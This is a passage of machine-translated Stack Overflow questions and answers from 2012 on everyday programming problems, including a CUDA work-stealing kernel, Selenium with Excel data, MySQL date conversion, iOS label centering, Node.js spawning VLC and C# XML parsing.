    work = aDeques[uiPopDequeIdx*DEQUE_SIZE + popStartIdxAndSize.x + iTid];
}

return true;
}

//----------------------------------------------------------------------------------------------------------------------------
// Function to push work on deques. To achieve better coalescent global memory accesses the input data is assumed to be tight
// packed in shared mem.
//----------------------------------------------------------------------------------------------------------------------------
template <typename Work>
bool __inline__ __device__ pushWork(int *aiDequesBottoms , Work *aDeques , const int &iTid , const int &iBid ,
const unsigned int &uiDequeOutputCounter , Work *aOutputLocalWork)
{
//Transfer to global mem.
unsigned int uiWorkLeft = uiDequeOutputCounter;
unsigned int uiThreadOffset = iTid;

while(uiWorkLeft > 0)
{
    unsigned int uiWorkTransfered = min(WORK_STEALING_BATCH_SIZE , uiWorkLeft);
    unsigned int uiPushStartIdx;
    bool bPushFlag;
    if(iTid == 0)
    {
        bPushFlag = pushBottom(aiDequesBottoms , iBid , uiWorkTransfered , uiPushStartIdx);
    }
    __syncthreads();
    if(!bPushFlag)
    {
        return false;
    }

    if(iTid < uiWorkTransfered)
    {
        aDeques[DEQUE_SIZE*iBid + uiPushStartIdx +  uiThreadOffset] = aOutputLocalWork[uiThreadOffset];
    }

    uiThreadOffset += WORK_STEALING_BATCH_SIZE;
    uiWorkLeft -= uiWorkTransfered;
}

return true;
}

void __global__ workKernel(bool *abDequeFlags , int *aiDequesBottoms , unsigned int *auiDequesAges , int2 *aDeques , 
int2 *aOutput , unsigned int *puiOutputCounter)
{
int iTid = threadIdx.x;
int iBid = blockIdx.x;

__shared__ int2 aOutputLocalWork[DEQUE_SHARED_SIZE];
__shared__ unsigned int uiPopDequeIdx;
__shared__ int2 popStartIdxAndSize;
__shared__ int iLocalDequeCounter;
__shared__ bool bPopFlag;
__shared__ unsigned int uiActiveDeques[NDEQUES]; //Contains indices for deques with useful work that can be stolen
__shared__ unsigned int uiActiveDequesIdx;
__shared__ unsigned int uiLastOutputCounter;

int2 work;
int iRun = 0;

while(true) //Work loop will continue until cannot pop from bottom or cannot steal work from other deques
{
    if(!popWork<int2>(abDequeFlags , aiDequesBottoms , auiDequesAges , aDeques , iTid , iBid , uiPopDequeIdx ,
        popStartIdxAndSize , iLocalDequeCounter , bPopFlag , uiActiveDeques , uiActiveDequesIdx , work))
    {   //No more work
        return; 
    }

    //Useful work comes here. For now, just some dummy code for testing.
    if(iRun < 5)
    {   //Just 5 iterations that generate more work
        if(iTid < popStartIdxAndSize.y)
        {
            unsigned int uiNewWorkCounter = 1;
            int iDequeOutputCounter = atomicAdd(&iLocalDequeCounter , uiNewWorkCounter);
            work.x++; work.y++;
            aOutputLocalWork[iDequeOutputCounter] = work;
            __syncthreads();

            if(iTid == 0)
            {
                uiLastOutputCounter = atomicAdd(puiOutputCounter , iLocalDequeCounter);
            }
            __syncthreads();

            if(iTid < iLocalDequeCounter) //assuming iLocalDequeCounter <= blockDim.x
            {
                aOutput[uiLastOutputCounter + iTid] = aOutputLocalWork[iTid];
            }
        }
    }

    //Push back to global mem
    if(!pushWork<int2>(aiDequesBottoms , aDeques , iTid , iBid , iLocalDequeCounter , aOutputLocalWork))
    {   //overflow
        return;
    }
    ++iRun;
}
} 
```

这是测试：

```
#define NDEQUES 256
#define DEQUE_SIZE 20000

void workStealingWrap(bool *abDequeFlags , int *auiDequesBottoms , unsigned int *auiDequesAges , int2 *aDeques , 
int2 *aOutput , unsigned int *puiOutputCounter)
{
workKernel<<<NDEQUES , WORK_STEALING_THREADS>>>(abDequeFlags , auiDequesBottoms , auiDequesAges , aDeques , aOutput , 
    puiOutputCounter);
CUT_CHECK_ERROR("workKernel");
}

//----------------------------------------------------------------------------------------------------------
// This entry point is for work stealing testing.
//----------------------------------------------------------------------------------------------------------
int main(int argc, char* argv[])
{
//Test 0: All deques start with 1 work item.
bool h_abDequeFlags[NDEQUES];
int h_aiDequesBottoms[NDEQUES];
unsigned int h_auiDequesAges[NDEQUES];
int2 *h_aDeques = (int2*) malloc(sizeof(int2)*NDEQUES*DEQUE_SIZE);
unsigned int h_uiOutputCounter;
int2 *h_aOutput = (int2*) malloc(sizeof(int2)*NDEQUES*DEQUE_SIZE);

for(int i = 0 ; i < NDEQUES ; ++i)
{
    h_abDequeFlags[i] = true;
    h_aiDequesBottoms[i] = 1;
    h_auiDequesAges[i] = 0;
    int2 work; work.x = i ; work.y = i;
    h_aDeques[DEQUE_SIZE*i] = work;
}

bool *d_abDequeFlags;
int *d_auiDequesBottoms;
unsigned int *d_auiDequesAges;
int2 *d_aDeques;
GPUMALLOC((void**)&d_abDequeFlags , sizeof(bool)*NDEQUES);
GPUMALLOC((void**)&d_auiDequesBottoms , sizeof(int)*NDEQUES);
GPUMALLOC((void**)&d_auiDequesAges , sizeof(unsigned int)*NDEQUES);
GPUMALLOC((void**)&d_aDeques , sizeof(int2)*NDEQUES*DEQUE_SIZE);

TOGPU(d_abDequeFlags , h_abDequeFlags , sizeof(bool)*NDEQUES);
TOGPU(d_auiDequesBottoms , h_aiDequesBottoms , sizeof(int)*NDEQUES);
TOGPU(d_auiDequesAges , h_auiDequesAges , sizeof(unsigned int)*NDEQUES);
TOGPU(d_aDeques , h_aDeques , sizeof(int2)*NDEQUES*DEQUE_SIZE);

int2 *d_aOutput;
unsigned int *d_puiOutputCounter;
GPUMALLOC((void**)&d_aOutput , sizeof(int2)*NDEQUES*DEQUE_SIZE);
GPUMALLOC((void**)&d_puiOutputCounter , sizeof(unsigned int));
GPUMEMSET(d_aOutput , -1 , sizeof(int2)*NDEQUES*DEQUE_SIZE);
GPUMEMSET(d_puiOutputCounter , 0 , sizeof(unsigned int));

workStealingWrap(d_abDequeFlags , d_auiDequesBottoms , d_auiDequesAges , d_aDeques , d_aOutput , d_puiOutputCounter);

FROMGPU(h_aOutput , d_aOutput , sizeof(int2)*NDEQUES*DEQUE_SIZE);
FROMGPU(&h_uiOutputCounter , d_puiOutputCounter , sizeof(unsigned int));
assert(h_uiOutputCounter == NDEQUES);
for(int i = 0 ; i < NDEQUES*DEQUE_SIZE ; ++i)
{
    int2 work = h_aOutput[i];
    if(i < NDEQUES)
    {
        assert(work.x >= 1 && work.x < NDEQUES*5 && work.y >= 1 && work.y < NDEQUES*5);
    }
    else
    {
        assert(work.x == -1 && work.y == -1);
    }
}

GPUFREE(d_abDequeFlags);
GPUFREE(d_auiDequesBottoms);
GPUFREE(d_auiDequesAges);
GPUFREE(d_aDeques);
GPUFREE(d_aOutput);
GPUFREE(d_puiOutputCounter);

safeFree(h_aDeques);
safeFree(h_aOutput);
} 
```

使用 NSight 调试此代码我已经验证只有前 8 个块正在运行。我想知道这是否是一个调度问题并且 popWork 轮询正在消耗所有资源，或者它只是我程序中的一个错误。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T17:29:44.617

我在代码中发现了一些问题。我没有运行它，所以我不知道它在多大程度上是相关的。

`popTop`缺少执行。我假设它可以成功也可以失败，结果会影响`bPopFlag`. 我假设您可以`uiActiveDequesIdx`在`bPopFlag`仍然为零的情况下具有非零值。

*   在这种情况下，`popWork`你有一个`while(!bPopFlag)`循环。想象两个经线到达`__syncthreads()`循环中的最后一个。现在，第一个 warp 将检查`uiActiveDequesIdx`（假设非零），回到循环的开头，并且`iTid`线程设置`uiActiveDequesIdx`为 0。现在第二个 warp 从最后一个 恢复执行`__syncthreads()`，检查`uiActiveDequesIdx`（现在是 0）并退出环形。从这一点开始，你的经线已经分道扬镳`__syncthreads()`，坏事将会发生。

*   在`pushWork`中，`bPushFlag`是本地寄存器。它仅由`iTid == 0`线程更改，但随后由所有线程读取。您可能会读取未初始化的值并进一步获得分歧的扭曲`__syncthreads()`。

可能还有更多我没有看到的问题。特别是，我担心您`__threadfence()`在全局内存中设置标志时可能会跳过（查看编程指南了解它的作用）

此外，请仔细检查其他循环是否存在与我上面报告的问题类似的同步问题——其中一些扭曲仍在循环的旧迭代中，而另一些则已经在新迭代中。我认为一个很好的通用方法是，如果您有一个取决于某些共享值的非发散循环，请始终将 a`__syncthreads()`放在循环的末尾，并且仅当您对代码进行一些后期细粒度优化时，尝试删除它.

# logging - Jmeter 记录活动线程

> ID：11583031
> 
> 赞同：0
> 
> 时间：2012-07-20T16:05:22.337
> 
> 标签：logging, jmeter

我正在尝试获取 jmeter 日志中的活动线程数，我已经在 GUI 选项的*jmeter.properties*文件广告中启用了它，我看到的是在生成的 xml 中它添加了两个属性，但是我无法理解它们是什么。
有人可以解释我吗？

```
<httpSample t="11946" ts="1342783786014" s="true" lb="Search Return" rc="200" rm="OK" tn="Test 1-17" dt="text" ng="11" na="11">
    <java.net.URL>http://mysite/search/</java.net.URL>
</httpSample> 
```

这就是我所拥有的，添加的参数是：*ng*和*na*

干杯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T16:43:21.553

也许在询问人们之前最好深入搜索文档......这是解决方案：

[http://jmeter.apache.org/usermanual/listeners.html#attributes](http://jmeter.apache.org/usermanual/listeners.html#attributes)

```
na   Number of active threads for all thread groups
ng   Number of active threads in this group 
```

# java - 如何从另一个数组类调用变量？

> ID：11583033
> 
> 赞同：0
> 
> 时间：2012-07-20T16:05:32.013
> 
> 标签：java, arrays, selenium, webdriver

我在带有 IUnit 的 Eclipse 中使用 Selenium Web 驱动程序。我有从 excel 文件中读取数据的代码。每列都显示为数组。这是代码：

```
class ReadExcel {
ArrayList path_name = new ArrayList();
        ArrayList field_key = new ArrayList();
        ArrayList field_name = new ArrayList();
        ArrayList window_new = new ArrayList();
        ArrayList link = new ArrayList();
        lov_name = new ArrayList();
    public void mai() {
        int i = 0;

        String path_namel = "", field_keyl = "", field_namel = "", window_newl = "", linkl = "", lov_namel = "";
        String filename = "E:/data.xls";
        if (filename != null && !filename.equals("")) {
            FileInputStream fs = new FileInputStream(filename);
            HSSFWorkbook wb = new HSSFWorkbook(fs);
            for (int k = 0; k < wb.getNumberOfSheets(); k++) {
                int j = i + 1;
                HSSFSheet sheet = wb.getSheetAt(k);
                int rows = sheet.getPhysicalNumberOfRows();
                for (int r = 1; r < rows; r++) {
                    HSSFRow row = sheet.getRow(r);
                    int cells = row.getPhysicalNumberOfCells();
                    HSSFCell cell1 = row.getCell(0);
                    path_namel = cell1.getStringCellValue();
                    HSSFCell cell2 = row.getCell(1);
                    field_keyl = cell2.getStringCellValue();
                    HSSFCell cell3 = row.getCell(2);
                    field_namel = cell3.getStringCellValue();
                    HSSFCell cell4 = row.getCell(3);
                    window_newl = cell4.getStringCellValue();
                    HSSFCell cell5 = row.getCell(4);
                    linkl = cell5.getStringCellValue();
                    HSSFCell cell6 = row.getCell(5);
                    lov_namel = cell6.getStringCellValue();

                    path_name.add(path_namel);
                    field_key.add(field_keyl);
                    field_name.add(linkl);
                    window_new.add(window_newl);
                    link.add(linkl);
                    lov_name.add(lov_namel);
                }
                i++;
            }
        }
    }
} 
```

在我的硒测试中，我有这样的循环：

```
for (int i=0; i<path_name.length; i++){
         driver.findElement(By.xpath(path_name[i])).click();
} 
```

在这里，我使用数组变量`path_name`，它必须`path_name`与 ReadExcel 类相等。实际上，我想将 excel 中的这些值用作数组。我应该如何从 ReadExcel 调用变量？

**编辑** 我尝试使用 getter 和 setter 方法。

```
int q;
String g;
public String getG() {
    return g;}
public void setG(String g) {
    this.g = g;}
public int getQ() {
    return q;}
public void setQ(int q) {
    this.q = q;}

q=path_name.size();
g=path_name.get(i).toString(); 
```

我的测试我以这种方式调用变量

```
ReadExcel h = new ReadExcel();
String k=   h.getG();
ReadExcel p = new ReadExcel();
int n=  p.getQ();

for (int j=0; j<n; j++){
driver.findElement(By.xpath(k)).click();} 
```

编辑器中没有错误，但循环不起作用。它应该点击链接（k），但没有效果。我也试试这个（在第一个答案中建议）

```
ReadExcel readExcel = new ReadExcel();
    ArrayList<String> path_name = readExcel.getPath_name();

    for(String pathName: path_name){
        driver.findElement(By.xpath(pathName)).click();
    } 
```

同样的效果。它不会点击链接

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:15:33.257

一种方法是在 ReadExcel 类中为要访问的变量实现`setter()`和方法。`getter()`它们显然是公共方法。

**编辑：**

根据您*尝试*更新的内容和我的理解猜测，您做错了很多事情。假设您正在从另一个类调用您的最后一段代码，*这就是您真正应该做的*：

另外，我假设你已经修改你的`ReadExcel`类看起来像这样

```
public class ReadExcel {

    ArrayList<String> pathName      = new ArrayList<String>();
    ArrayList<String> fieldKey      = new ArrayList<String>();
    ArrayList<String> fieldName     = new ArrayList<String>();
    ArrayList<String> windowNew     = new ArrayList<String>();
    ArrayList<String> link          = new ArrayList<String>();

    public ReadExcel() {
        pathName = new ArrayList<String>();
        fieldKey = new ArrayList<String>();
        fieldName = new ArrayList<String>();
        windowNew = new ArrayList<String>();
        link      = new ArrayList<String>();
    }

    /**
    * Not so sure of this method name. But make sure that this method is called before
    * you try to call getXX() methods
    */
    public void mai() {
        String filename = "E:/data.xls";

        if(fileName == null || "".equals(fileName))
            return;

        HSSFWorkbook workBook = null;
        FileInputStream fileInputStream = null;
        HSSFSheet sheet;
        HSSFRow row;

        int rows;

        try{
            fileInputStream = new FileInputStream(new File(fileName));
            workBook = new HSSFWorkbook(fileInputStream);

            for(int sheetIndex = 0; sheetIndex < workBook.getNumberOfSheets(); sheetIndex++){
                sheet = workBook.getSheetAt(sheetIndex);

                rows = sheet.getPhysicalNumberOfRows();

                for(int rowIndex = 0; rowIndex < rows; rowIndex++){
                    /**
                     * Update with your own logic for retrieval
                     */
                    row = sheet.getRow(rowIndex);
                    if(row.getPhysicalNumberOfCells() < 6)
                        continue;

                    pathName.add(row.getCell(0).getStringCellValue());
                    fieldKey.add(row.getCell(0).getStringCellValue());
                    fieldName.add(row.getCell(0).getStringCellValue());
                    windowNew.add(row.getCell(0).getStringCellValue());
                    link.add(row.getCell(0).getStringCellValue());
                }
            }

        } catch (FileNotFoundException fileNotFoundException) {
            fileNotFoundException.printStackTrace();
        } catch (IOException ioException) {
            ioException.printStackTrace();
        }finally{
            if(fileInputStream != null){
                try {
                    fileInputStream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            workBook = null;
        }
        }
    }

    /**
    * The getter/setter methods for the variables
    */
    public ArrayList<String> getPathName() {
        return pathName;
    }

    public void setPathName(ArrayList<String> pathName) {
        this.pathName = pathName;
    }

    public ArrayList<String> getFieldKey() {
        return fieldKey;
    }

    public void setFieldKey(ArrayList<String> fieldKey) {
        this.fieldKey = fieldKey;
    }

    public ArrayList<String> getFieldName() {
        return fieldName;
    }

    public void setFieldName(ArrayList<String> fieldName) {
        this.fieldName = fieldName;
    }

    public ArrayList<String> getWindowNew() {
        return windowNew;
    }

    public void setWindowNew(ArrayList<String> windowNew) {
        this.windowNew = windowNew;
    }

    public ArrayList<String> getLink() {
        return link;
    }

    public void setLink(ArrayList<String> link) {
        this.link = link;
    }
} 
```

我希望你在某个地方调用你的`mai()`方法（*虽然这个名字听起来很奇怪*）来从 excel 中检索数据并将它们存储`ArrayList`在你尝试调用以下代码之前：

```
ReadExcel readExcel = new ReadExcel();
ArrayList<String> path_name = readExcel.getPath_name();

for(String pathName: path_name){
    driver.findElement(By.xpath(pathName).click();
} 
```

一些指向您的代码的指针：

*   使用泛型。而不是蔑视`ArrayList pathNameList`考虑，使用`ArrayList<String> pathNameList`

*   如果您在编码时使用 Java 命名约定，它看起来不错。其中之一是使用混合大小写字母组成方法名称，以小写字母开头，每个后续单词以大写字母开头。因此，与其拥有一个`getPath_name()`，不如考虑拥有类似`getPathName()`甚至是`getPath_Name()`（*尽管我们大多数人更喜欢第一个*）。[这是一个可以帮助您的链接。](http://www.cwu.edu/~gellenbe/javastyle/naming.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:19:37.407

你能把你的变量转换成那个类的字段吗？然后在那里添加一个方法来将该字段的值返回给任何感兴趣的人。

# python - 在 Unity 中使用 pygame 的 midi 和 unityscript（Unity 脚本）

> ID：11583043
> 
> 赞同：1
> 
> 时间：2012-07-20T16:06:03.767
> 
> 标签：python, unity3d, pygame, unityscript

我想用我的 midi 键盘上的滑块和旋钮来控制 Unity 中的变量。我已经在 Python 中使用 PyGame 完成了这项工作，并且效果很好。我想知道是否可以以某种方式将我的 unityscript 文件连接到 Python 文件。

这部分是学术性的。我想知道如何在不做太多黑客攻击的情况下从 python 脚本中获取变量。

这个想法是你有从 0 到 127 的 midi 值，滑块控制，你移动它来更改 Unity 中的参数，例如位置或类似的东西。

```
import time
from pygame import midi
midi.init()
foo=midi.get_default_input_id()
x=midi.Input(foo)
while 1:

    midiValue =  x.read(1)
    try:
        midiValue=midiValue[0]
        print midiValue
    except:
        pass
    time.sleep(.01) 
```

# mysql - 如何将 varchar 转换/转换为日期？

> ID：11583045
> 
> 赞同：2
> 
> 时间：2012-07-20T16:06:10.057
> 
> 标签：mysql, sql, mysql-error-1064

`varchar(mm-dd-yyyy)`我在 mySQL 5.1 中有一个数据类型的日期列。如何将其转换为 DATE？

这是我到目前为止所拥有的 -

```
SELECT id, date 
FROM tableName 
WHERE (CAST((SUBSTRING (date FROM 7 FOR 4 )||'/'||SUBSTRING (date FROM 4 FOR 2 )||'/'||SUBSTRING (date FROM 1 FOR 2 )) AS DATE) >= '01/01/2012' ) 
ORDER BY date DESC; 
```

得到这个

> 错误 - #1064 - 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以获取在 'FROM 7 FOR 4 附近使用的正确语法）

请帮忙。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-20T16:10:33.530

您可以使用 MySQL 的[`STR_TO_DATE()`](http://dev.mysql.com/doc/refman/5.1/en/date-and-time-functions.html#function_str-to-date)功能

```
SELECT id, date 
FROM tableName 
WHERE STR_TO_DATE(date,'%Y-%m-%d') >= '01/01/2012' 
ORDER BY date DESC; 
```

虽然我怀疑你会更容易使用 Unix Timestamps

```
SELECT id, date 
FROM tableName 
WHERE UNIX_TIMESTAMP(STR_TO_DATE(date,'%d/%m/%Y')) >= UNIX_TIMESTAMP('01/01/2012') 
ORDER BY date DESC; 
```

# sql-server - 如何计算交易数据

> ID：11583046
> 
> 赞同：1
> 
> 时间：2012-07-20T16:06:14.417
> 
> 标签：sql-server, tsql

我有一张这样的表，考虑一下我有大约 500 万条记录。

```
 Transaction id|Amount|CustomerId|date
                1        |  100 | 20       |1/1/2012  
                2        |  230 | 30       |2/2/2012
                3        |  320 | 20       |2/3/2012
                   etc... 
```

我怎样才能找到每个客户在 2012 年每个季度最后 5 笔交易的总金额？

输出：Quarter|Customerid|totalAmount

```
 1   |  20      | 40000
             1   |  30      | 300000
             2 ...etc... 
```

请写一个有效的方法..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:25:41.453

您应该发布 ddl。但是您可以尝试这样的事情。它应该可以工作..

```
with mycte as
(
select customerid,datepart(qq,dt) as qtr,amount,
row_number() over(partition  by                    
datepart   (qq,dt),customerid order by dt desc,transaction id desc) as rn
from table where dt >= '01/01/2012'
) 
select qtr,customerid,sum(amount) as amt
from mycte
where rn <= 5
group by qtr,customerid 
```

如果您希望其他人为您编写有效的查询。那么您必须通过提供 ddl、索引等和一些示例数据以及您迄今为止使用的方法来做一些艰苦的工作。

# iphone - 对齐 UILabel 以 UIView 为中心

> ID：11583047
> 
> 赞同：1
> 
> 时间：2012-07-20T16:06:15.967
> 
> 标签：iphone, objective-c, ios, ipad

我正在实现一个页脚视图，它是一个 UIView，它里面有一个标签。我想要它让 UILabel 一直保持在中心，但它不会。这是我的代码：

```
- (void)setupFooterView
{
    UIView *footerView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, self.scrollView_.frameWidth, kFooterViewHeight)];
    [footerView setAutoresizingMask:UIViewAutoresizingFlexibleLeftMargin | UIViewAutoresizingFlexibleRightMargin | UIViewAutoresizingFlexibleWidth];
    [footerView setBackgroundColor:[UIColor clearColor]];

    UILabel *loadMoreLabel = [[UILabel alloc] initWithFrame:CGRectZero];
    [loadMoreLabel setBackgroundColor:[UIColor clearColor]];
    [loadMoreLabel setFont:[UIFont fontWithName:kProximaNova size:16]];
    [loadMoreLabel setTextColor:[UIColor whiteColor]];
    [loadMoreLabel setLineBreakMode:UILineBreakModeTailTruncation];
    CGSize desiredSize =  [[PNRConstants kLoadingMore] sizeWithFont:loadMoreLabel.font constrainedToSize:CGSizeMake(footerView.frameWidth, footerView.frameHeight) lineBreakMode:loadMoreLabel.lineBreakMode];
    [loadMoreLabel setFrameSize:desiredSize];
    [loadMoreLabel setCenter:CGPointMake(footerView.frameWidth/2, footerView.frameHeight/2)];
    self.loadingMoreLabel_ = loadMoreLabel;
    [footerView addSubview:self.loadingMoreLabel_];
    [loadMoreLabel release];

    UIActivityIndicatorView *spinner = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleWhite];
    [spinner setBackgroundColor:[UIColor clearColor]];
    [spinner setFrameX:self.loadingMoreLabel_.frameX - spinner.frameWidth - 10];
    [spinner setFrameY:self.loadingMoreLabel_.frameY];
    self.spinner_ = spinner;
    [footerView addSubview:self.spinner_];
    [spinner release]; 

    [self.scrollView_ setFooterView_:footerView];
    [footerView release];
} 
```

我在这里做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T23:53:27.057

```
[loadMoreLabel setCenter:CGPointMake(footerView.frameWidth/2, footerView.frameHeight/2)]; 
```

footerView.frameWidth/2 需要是

```
footerView.frameWidth/2 - loadMoreLabel.frame.size.width/2 
```

这是因为标签的锚点在左上角而不是在中心。你减去标签宽度的一半来解决这个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:09:14.940

设置标签的框架后：`[yourLabel setCenter: yourFooter.center];`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-21T06:10:24.717

正确的方法：使用笔尖，设置调整大小蒙版并收工。

痛苦的方式：以编程方式创建标签。然后有几个选项： - 使标签与页脚一样宽，并将其文本设置为居中对齐。- 将标签的中心属性设置为 footer.frame.width/2 和 footer.frame.height/2

编辑：哦，你已经知道了。将 yournlabel 的文本对齐属性设置为居中。

# node.js - Node.js 生成 vlc 子进程在 express 中不起作用

> ID：11583054
> 
> 赞同：1
> 
> 时间：2012-07-20T16:06:33.237
> 
> 标签：node.js, vlc, child-process

我正在使用 node.js 和 express 为我的家庭媒体中心创建一个可以通过浏览器操作的控制器。

我在生成 VLC 进程时遇到了很多麻烦，但奇怪的是，它只有在从节点提示符执行时才有效，而不是在从文件运行时。

这是我测试过的：

在节点命令行/解释器中：`require('child_process').spawn('vlc');` 这正如我所料，我可以看到 vlc 窗口打开并在屏幕上持续存在。

如果我采用完全相同的代码行并将其放在另一个文件中（例如 test.js）并从命令行运行它，则没有任何反应`node test.js`。几秒钟后注销子进程对象会给我这个：

```
{ _closesNeeded: 3,
  _closesGot: 3,
  signalCode: null,
  exitCode: 1,
  killed: false,
  _internal: null,
  pid: 11837,
  stdin:
   { _handle: null,
     _pendingWriteReqs: 0,
     _flags: 0,
     _connectQueueSize: 0,
     destroyed: true,
     bytesRead: 0,
     bytesWritten: 0,
     allowHalfOpen: undefined,
     writable: false,
     readable: false,
     _connecting: false,
     _connectQueue: null,
     _idleNext: null,
     _idlePrev: null },
  stdout:
   { _handle: null,
     _pendingWriteReqs: 0,
     _flags: 1,
     _connectQueueSize: 0,
     destroyed: true,
     bytesRead: 0,
     bytesWritten: 0,
     allowHalfOpen: undefined,
     writable: false,
     readable: false,
     _events: { close: [Function] },
     _connecting: false,
     _connectQueue: null,
     _idleNext: null,
     _idlePrev: null },
  stderr:
   { _handle: null,
     _pendingWriteReqs: 0,
     _flags: 1,
     _connectQueueSize: 0,
     destroyed: true,
     bytesRead: 215,
     bytesWritten: 0,
     allowHalfOpen: undefined,
     writable: false,
     readable: false,
     _events: { close: [Function] },
     _connecting: false,
     _connectQueue: null,
     _idleNext: null,
     _idlePrev: null } } 
```

对此特别奇怪的是，我可以以相同的方式启动其他程序并且它可以工作。例如，用“gedit”替换“vlc”会导致文本编辑器完全按预期显示。

有人知道这可能是什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T16:10:53.663

这只是一种预感，但我敢打赌，在 VLC 进程甚至可以说“运行”之前，你就过早地退出了测试。

像这样执行它：

```
var spawn = require('child_process').spawn;
var vlc = spawn('vlc');
vlc.on('exit', function(code){
  console.log('Exit code: ' + code); 
  //EXIT TEST HERE
}); 
```

[生成文档。](http://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options)

**编辑：** 刚刚看到'test.js'并认为你正在运行测试。发布您的 Express 代码的相关部分。

# health-monitoring - 常见的量化自我数据格式

> ID：11583055
> 
> 赞同：2
> 
> 时间：2012-07-20T16:06:34.410
> 
> 标签：health-monitoring, healthvault

我有兴趣了解有关[Quantified Self](http://quantifiedself.com/)数据源的最新技术。具体来说：

*   我应该期望从常见的 QS 应用程序中看到哪些类型的数据源？
*   我可以期待常见格式（即[GPS 交换格式](http://en.wikipedia.org/wiki/GPS_eXchange_Format)）的哪些类型的变化 这些格式的示例或这些格式的示例的链接？
*   作为应用程序构建者访问数据的常用方法是什么？
*   作为用户/消费者访问原始数据的常用方法是什么？
*   这些设备的数据访问策略是什么？
*   哪些设备最重要（请提供数据参考，而不仅仅是意见）？

我知道这是一个很大的、多部分的问题，但是在没有其他上下文的情况下回答其中的一部分将很难决定支持和使用什么。我计划自己针对最流行的应用程序进行这项研究。我将在此处发布我的答案，但我希望其他人能够评论和扩展该内容。因此，如果您要添加另一个应用程序，请考虑将其放在这里。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:06:34.410

以下是常用设备：

## Fitbit

*   数据类型：内插到步数/睡眠数据中的运动数据。
*   用户可以记录其他类型的健康数据。
*   数据变化：无
*   应用程序访问：从[dev.fitbit.com访问基于 OAuth 的 XML 和 JSON](http://dev.fitbit.com/)
*   用户访问：数据下载是一项高级功能。登录 fitbit.com（如果您还没有付款，请付费）以获取下载权限。[http://blog.fitbit.com/?p=360](http://blog.fitbit.com/?p=360)

## RunKeeper HealthGraph

*   数据类型：来自 RunKeeper 应用程序的 GPS 数据，但也可以通过 fitbit withings 等进行管道传输
*   用户可以记录其他类型的健康数据。
*   数据变化：无
*   应用程序访问：从[dev.fitbit.com访问基于 OAuth 的 XML 和 JSON](http://dev.fitbit.com/)
*   用户访问：RunKeeper 为所有用户提供数据下载过程，如下所述：http: [//support.runkeeper.com/entries/21696773-how-to-export-your-runkeeper-data](http://support.runkeeper.com/entries/21696773-how-to-export-your-runkeeper-data)

## 映射我的运行

*   数据类型：GPS运行数据
*   用户可以记录其他类型的健康数据。
*   数据变化：无
*   应用程序访问：从[dev.fitbit.com访问基于 OAuth 的 XML 和 JSON](http://dev.fitbit.com/)
*   用户访问：可以下载带路线但不带时间的GPX：http: [//support.mapmyfitness.com/mapmyfitness/topics/when_i_export_gpx_file_i_can_not_find_attitude_and_time_information](http://support.mapmyfitness.com/mapmyfitness/topics/when_i_export_gpx_file_i_can_not_find_attitude_and_time_information)

# c# - C# XML 如何按属性检索字段的内部文本？

> ID：11583056
> 
> 赞同：1
> 
> 时间：2012-07-20T16:06:33.863
> 
> 标签：c#, xml, xml-parsing

这是 XML 示例：

```
 <?xml version="1.0" ?> 
  <XMLScreen xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <CX>80</CX> 
  <CY>24</CY> 
  <Formatted>true</Formatted> 
  <Field>
  <Location position="1" left="1" top="0" length="69" /> 
  <Attributes Base="226" Protected="false" FieldType="High" /> 
  *SDC SCHEDULING CATEGORY UPDATE 
  </Field>
  </XMLScreen> 
```

我想根据其检索每个字段的内部文本`Location position`。

到目前为止，我所拥有的是：

```
 XmlDocument xmlDoc = new XmlDocument();
  xmlDoc.LoadXml(myEm.CurrentScreenXML.GetXMLText());
  XmlNodeList fields = xmlDoc.GetElementsByTagName("Field");

  MessageBox.Show("Field spot: " + i + " Contains: " + fields[i].InnerText); 
```

而且我希望能够通过传入一些位置位置来提取字段的内部文本。所以如果我说`foo[i]`我希望能够得到内文

> *SDC 计划类别更新

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:24:39.073

Something like that, with XDocument instead of XmlDocument (well, if you're not in .net 3.5 or higher, we'll have a problem).

```
private string GetTextByLocationId(XDocument document, int id)
{
     var field = document.Descendants("Field").FirstOrDefault(m => m.Element("Location").Attribute("position").Value == id.ToString());
     if (field == null) return null;
     return field.Value;
} 
```

and usage

```
var xDocument = XDocument.Load(<pathToXmlFile or XmlReader or string or ...>);
var result = GetTextByLocationId(xDocument, 1); 
```

**EDIT**

or if you want a dictionary with :key = position / value = text

```
private static Dictionary<int, string> ParseLocationAndText(XDocument document)
        {
            var fields = document.Descendants("Field");
            return fields.ToDictionary(
                 f => Convert.ToInt32(f.Element("Location").Attribute("position").Value),
                 f => f.Value);
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T19:18:11.287

尝试，

```
XElement root = XElement.Parse(myEm.CurrentScreenXML.GetXMLText());
XElement field = root.XPathSelectElement(
                    string.Format("Field[Location/@position='{0}']", 1));
string text = field.Value; 
```

您将需要使用以下内容才能将 XPath 与 XElements 一起使用。

```
using System.Xml.XPath; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:35:54.087

您应该使用 xpath 搜索查询：

```
 XmlDocument xmlDoc = new XmlDocument();
  xmlDoc.LoadXml(xml);
  int nodeId = 4;
  XmlNode node = xmlDoc.SelectSingleNode(String.Format(@"//Location[@position='{0}']", nodeId));
  if (node != null)
  {
      String field = node.ParentNode.InnerText;
  } 
```

